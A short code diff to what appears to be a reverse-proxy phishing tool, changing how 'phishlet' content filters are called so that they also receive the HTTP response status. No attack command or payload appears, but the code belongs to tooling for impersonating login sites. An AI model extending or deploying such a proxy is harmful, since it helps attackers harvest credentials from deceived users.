@@ -3102,7 +3102,7 @@ async def proxy_handler(request):
                             # Process phishlet filters after content replacements
                             if current_phishlet_data:
                                 request_path = str(request.url.path)
-                                filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, debug_log)
+                                filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, resp.status, debug_log)
                                 if filter_replacements:
                                     # Apply filter replacements directly to the content
                                     for old_text, new_text in filter_replacements.items():
